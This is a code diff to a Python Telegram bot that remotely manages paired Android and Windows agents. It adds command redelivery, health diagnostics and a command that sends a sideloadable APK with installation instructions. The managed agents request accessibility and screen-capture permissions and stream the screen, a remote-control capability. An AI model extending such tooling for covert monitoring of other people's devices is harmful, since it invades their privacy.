@@ -56,6 +56,7 @@ DEVICE_TTL_SECONDS = int(os.getenv("DEVICE_TTL_SECONDS", "300"))
 DEVICE_MONITOR_INTERVAL_SECONDS = int(os.getenv("DEVICE_MONITOR_INTERVAL_SECONDS", "60"))
 COMMAND_PENDING_TIMEOUT_SECONDS = int(os.getenv("COMMAND_PENDING_TIMEOUT_SECONDS", "120"))
 COMMAND_DELIVERED_TIMEOUT_SECONDS = int(os.getenv("COMMAND_DELIVERED_TIMEOUT_SECONDS", "180"))
+COMMAND_REDELIVERY_GRACE_SECONDS = int(os.getenv("COMMAND_REDELIVERY_GRACE_SECONDS", "45"))
 COMMAND_HISTORY_TTL_SECONDS = int(os.getenv("COMMAND_HISTORY_TTL_SECONDS", "86400"))
 AUTO_REPAIR_COOLDOWN_SECONDS = int(os.getenv("AUTO_REPAIR_COOLDOWN_SECONDS", "300"))
 BASE_DIR = Path(__file__).resolve().parent
@@ -95,6 +96,23 @@ BOT_POLLING_READY = False
 BOT_POLLING_STATUS = "starting"
 BOT_INSTANCE: Bot | None = None
 BOT_LOOP: asyncio.AbstractEventLoop | None = None
+SAFE_COMMAND_REDELIVERY_TYPES = {
+    "ping",
+    "repair_agent",
+    "request_actions",
+    "request_notification_permission",
+    "request_battery_permission",
+    "request_accessibility_permission",
+    "request_screen_permission",
+    "request_screen",
+    "stop_screen",
+    "setup_wizard",
+    "open_settings",
+    "open_wifi_settings",
+    "open_battery_settings",
+    "open_app_details",
+}
+SAFE_REDELIVERY_RESULT = "Safe redelivery scheduled once after delivery lease expired."
 
 
 def now_ts() -> int:
@@ -647,6 +665,7 @@ def device_notify_snapshot(device: dict) -> dict:
     telemetry = device.get("telemetry") or {}
     diagnostics = device.get("diagnostics") or {}
     health = device.get("health") or {}
+    last_command = diagnostics.get("last_command") or {}
     battery_percent = telemetry.get("battery_percent")
     try:
         battery_percent = int(battery_percent)
@@ -664,7 +683,10 @@ def device_notify_snapshot(device: dict) -> dict:
         "accessibility": bool(telemetry.get("accessibility")),
         "screen_streaming": bool(telemetry.get("screen_streaming")),
         "last_error": str(telemetry.get("last_error") or "")[:180],
+        "last_command_error": str(telemetry.get("last_command_error") or "")[:180],
         "screen_error": str(telemetry.get("screen_error") or "")[:180],
+        "last_command_status": str(last_command.get("status") or ""),
+        "last_command_result": str(last_command.get("result") or "")[:180],
         "pending_commands": int(diagnostics.get("pending_commands") or 0),
         "delivered_commands": int(diagnostics.get("delivered_commands") or 0),
     }
@@ -726,8 +748,12 @@ def process_device_notifications(device: dict, force: bool = False) -> None:
                 alerts.append(("трансляция экрана запущена" if snapshot["screen_streaming"] else "трансляция экрана остановлена", {"kind": "screen"}))
             if not previous.get("last_error") and snapshot["last_error"]:
                 alerts.append((f"ошибка агента: {snapshot['last_error']}", {"kind": "agent_error"}))
+            if not previous.get("last_command_error") and snapshot["last_command_error"]:
+                alerts.append((f"ошибка опроса команд: {snapshot['last_command_error']}", {"kind": "agent_error"}))
             if not previous.get("screen_error") and snapshot["screen_error"]:
                 alerts.append((f"ошибка экрана: {snapshot['screen_error']}", {"kind": "screen_error"}))
+            if previous.get("last_command_status") != "failed" and snapshot["last_command_status"] == "failed":
+                alerts.append((f"команда завершилась ошибкой: {snapshot['last_command_result']}", {"kind": "command_queue"}))
             if int(previous.get("pending_commands") or 0) < 3 <= snapshot["pending_commands"]:
                 alerts.append((f"очередь команд растет: {snapshot['pending_commands']} pending", {"kind": "command_queue"}))
             if int(previous.get("delivered_commands") or 0) < 2 <= snapshot["delivered_commands"]:
@@ -850,7 +876,7 @@ def root_settings_text() -> str:
             f"DB: {DB_PATH}",
             f"Device TTL: {DEVICE_TTL_SECONDS}s",
             f"Device monitor: every {DEVICE_MONITOR_INTERVAL_SECONDS}s",
-            f"Command timeout: pending={COMMAND_PENDING_TIMEOUT_SECONDS}s, delivered={COMMAND_DELIVERED_TIMEOUT_SECONDS}s",
+            f"Command timeout: pending={COMMAND_PENDING_TIMEOUT_SECONDS}s, delivered={COMMAND_DELIVERED_TIMEOUT_SECONDS}s, redelivery={COMMAND_REDELIVERY_GRACE_SECONDS}s",
             f"Command history TTL: {COMMAND_HISTORY_TTL_SECONDS}s",
             f"Auto repair cooldown: {AUTO_REPAIR_COOLDOWN_SECONDS}s",
             f"Device alerts: {'on' if notify_settings.get('enabled') else 'off'}",
@@ -885,6 +911,7 @@ HELP_TEXT = (
     "/pair — QR и код привязки\n"
     "/devices — список устройств\n"
     "/apk — Lite/Full APK и ссылки\n"
+    "/send_apk — отправить APK файлом в Telegram\n"
     "/build_apk Название — собрать Lite APK\n"
     "/build_apk_full Название — собрать Full APK\n"
     "/build_pc_agent — собрать Windows EXE\n"
@@ -1266,6 +1293,43 @@ async def send_apk_list(message: Message) -> None:
         return
     audit_message(message, "command_apk", "Opened APK list")
     await message.answer(apk_list_text(), reply_markup=apk_list_keyboard())
+
+
+async def answer_apk_file(message: Message) -> bool:
+    apk_path = agent_apk_path()
+    if not apk_path:
+        await message.answer(
+            "Локальный APK пока не найден на сервере.\n\n"
+            "Варианты без страницы сайта:\n"
+            "1. Собери APK командой `/build_apk Hunter Agent`, потом снова отправь `/send_apk`.\n"
+            "2. Если APK уже есть в GitHub Release, скачай файл напрямую:\n"
+            f"Lite: {release_apk_url('lite')}\n"
+            f"Full: {release_apk_url('full')}",
+            reply_markup=apk_list_keyboard(),
+            parse_mode="Markdown",
+        )
+        return False
+
+    await message.answer_document(
+        FSInputFile(apk_path, filename=apk_path.name),
+        caption=(
+            "APK файл отправлен напрямую.\n\n"
+            "На Android открой этот файл из Telegram, разреши установку из Telegram/Files, "
+            "потом вернись в бота и нажми /pair для привязки телефона."
+        ),
+    )
+    return True
+
+
+async def send_apk_file(message: Message) -> None:
+    if not await ensure_message_admin(message):
+        return
+    sent = await answer_apk_file(message)
+    if sent:
+        apk_path = agent_apk_path()
+        audit_message(message, "send_apk_file", f"Sent local APK file: {apk_path.name if apk_path else AGENT_APK_NAME}", {"path": str(apk_path) if apk_path else ""})
+    else:
+        audit_message(message, "send_apk_missing", "Requested direct APK file, but local APK is missing")
 
 
 def probe_url(url: str, method: str = "GET") -> tuple[bool, str]:
@@ -1972,14 +2036,33 @@ def save_device_maintenance_state(data: dict) -> None:
 def expire_stale_commands() -> dict:
     now = now_ts()
     pending_before = max(0, now - COMMAND_PENDING_TIMEOUT_SECONDS)
+    redelivery_before = max(0, now - COMMAND_REDELIVERY_GRACE_SECONDS)
     delivered_before = max(0, now - COMMAND_DELIVERED_TIMEOUT_SECONDS)
     history_before = max(0, now - COMMAND_HISTORY_TTL_SECONDS)
+    redelivery_placeholders = ",".join("?" for _ in SAFE_COMMAND_REDELIVERY_TYPES)
     with db_connect() as connection:
+        redelivery_result = connection.execute(
+            f"""
+            UPDATE commands
+            SET status = 'pending', result = ?, updated_at = ?
+            WHERE status = 'delivered'
+              AND updated_at < ?
+              AND COALESCE(result, '') != ?
+              AND type IN ({redelivery_placeholders})
+            """,
+            (
+                SAFE_REDELIVERY_RESULT,
+                now,
+                redelivery_before,
+                SAFE_REDELIVERY_RESULT,
+                *sorted(SAFE_COMMAND_REDELIVERY_TYPES),
+            ),
+        )
         pending_result = connection.execute(
             """
             UPDATE commands
             SET status = 'timeout', result = ?, updated_at = ?
-            WHERE status = 'pending' AND created_at < ?
+            WHERE status = 'pending' AND updated_at < ?
             """,
             ("Команда устарела до доставки агенту.", now, pending_before),
         )
@@ -1999,6 +2082,7 @@ def expire_stale_commands() -> dict:
             (history_before,),
         )
     return {
+        "safe_redelivered": max(0, redelivery_result.rowcount or 0),
         "pending_timeout": max(0, pending_result.rowcount or 0),
         "delivered_timeout": max(0, delivered_result.rowcount or 0),
         "deleted_history": max(0, cleanup_result.rowcount or 0),
@@ -2027,6 +2111,14 @@ def device_needs_auto_repair(device: dict) -> tuple[bool, str]:
         error_count = int(telemetry.get("error_count") or 0)
     except (TypeError, ValueError):
         error_count = 0
+    try:
+        command_error_count = int(telemetry.get("command_error_count") or 0)
+    except (TypeError, ValueError):
+        command_error_count = 0
+    try:
+        pending_completion_age = int(telemetry.get("pending_completion_age") or -1)
+    except (TypeError, ValueError):
+        pending_completion_age = -1
 
     if "pairing_revoked" in issues:
         return False, ""
@@ -2034,6 +2126,10 @@ def device_needs_auto_repair(device: dict) -> tuple[bool, str]:
         return True, "command_queue_stuck"
     if delivered_commands >= 2 and oldest_delivered_age > COMMAND_DELIVERED_TIMEOUT_SECONDS:
         return True, "delivered_commands_stuck"
+    if telemetry.get("last_command_error") or command_error_count >= 2:
+        return True, "command_poll_error"
+    if pending_completion_age > 30:
+        return True, "completion_outbox_stuck"
     if telemetry.get("last_error") or telemetry.get("screen_error") or error_count >= 2:
         return True, "agent_error"
     if str(health.get("state") or "") in {"degraded", "warning"}:
@@ -2117,7 +2213,7 @@ def device_diagnostics(owner_id: str, device_id: str) -> dict:
     with db_connect() as connection:
         rows = connection.execute(
             """
-            SELECT status, MIN(created_at) AS oldest, COUNT(*) AS count
+            SELECT status, MIN(updated_at) AS oldest, COUNT(*) AS count
             FROM commands
             WHERE owner_id = ? AND device_id = ? AND status IN ('pending', 'delivered')
             GROUP BY status
@@ -2173,6 +2269,11 @@ def device_health(device: dict, diagnostics: dict) -> dict:
     oldest_pending_age = int(diagnostics.get("oldest_pending_age") or 0)
     delivered_commands = int(diagnostics.get("delivered_commands") or 0)
     oldest_delivered_age = int(diagnostics.get("oldest_delivered_age") or 0)
+    last_command = diagnostics.get("last_command") or {}
+    try:
+        pending_completion_age = int(telemetry.get("pending_completion_age") or -1)
+    except (TypeError, ValueError):
+        pending_completion_age = -1
 
     issues: list[str] = []
     hints: list[str] = []
@@ -2195,6 +2296,15 @@ def device_health(device: dict, diagnostics: dict) -> dict:
     if telemetry.get("last_error"):
         issues.append("agent_error")
         hints.append(str(telemetry.get("last_error"))[:160])
+    if telemetry.get("last_command_error"):
+        issues.append("command_poll_error")
+        hints.append(str(telemetry.get("last_command_error"))[:160])
+    if pending_completion_age > 30:
+        issues.append("completion_outbox_stuck")
+        hints.append("Agent executed a command and is retrying the completion callback.")
+    if last_command.get("status") == "failed":
+        issues.append("last_command_failed")
+        hints.append(str(last_command.get("result") or "Last command failed.")[:160])
     if telemetry.get("screen_error"):
         issues.append("screen_error")
         hints.append(str(telemetry.get("screen_error"))[:160])
@@ -2422,6 +2532,7 @@ def apk_list_text() -> str:
 def apk_list_keyboard() -> InlineKeyboardMarkup:
     return InlineKeyboardMarkup(
         inline_keyboard=[
+            [InlineKeyboardButton(text="Отправить APK файлом", callback_data="send_apk_file")],
             [InlineKeyboardButton(text="Скачать Lite APK", url=release_apk_url("lite"))],
             [InlineKeyboardButton(text="Скачать Full APK", url=release_apk_url("full"))],
             [InlineKeyboardButton(text="Открыть страницу установки", url=f"{public_server_url()}/agent")],
@@ -3429,7 +3540,7 @@ class MiniAppRequestHandler(SimpleHTTPRequestHandler):
                 str(payload.get("result", "")).strip(),
             )
             if not command:
-                self.send_json({"error": "command not found"}, HTTPStatus.NOT_FOUND)
+                self.send_json({"ok": True, "stale": True, "message": "command not found or already expired"})
                 return
         except (json.JSONDecodeError, ValueError) as exc:
             self.send_json({"error": str(exc)}, HTTPStatus.BAD_REQUEST)
@@ -3750,6 +3861,18 @@ async def callbacks(callback: CallbackQuery) -> None:
         await show_bot_screen(callback, apk_list_text(), reply_markup=apk_list_keyboard())
         return
 
+    if action == "send_apk_file":
+        if not await ensure_callback_admin(callback):
+            return
+        await callback.answer("Sending APK...")
+        sent = await answer_apk_file(callback.message)
+        if sent:
+            apk_path = agent_apk_path()
+            audit_callback(callback, "send_apk_file", f"Sent local APK file: {apk_path.name if apk_path else AGENT_APK_NAME}", {"path": str(apk_path) if apk_path else ""})
+        else:
+            audit_callback(callback, "send_apk_missing", "Requested direct APK file, but local APK is missing")
+        return
+
     if action == "apk_mode_compare":
         await callback.answer()
         await show_bot_screen(
@@ -4015,6 +4138,7 @@ async def run_bot() -> None:
     dp.message.register(send_connect, Command("connect"))
     dp.message.register(send_devices, Command("devices"))
     dp.message.register(send_apk_list, Command("apk"))
+    dp.message.register(send_apk_file, Command("send_apk"))
     dp.message.register(send_build_apk, Command("build_apk"))
     dp.message.register(send_build_apk_full, Command("build_apk_full"))
     dp.message.register(send_build_pc_agent, Command("build_pc_agent"))
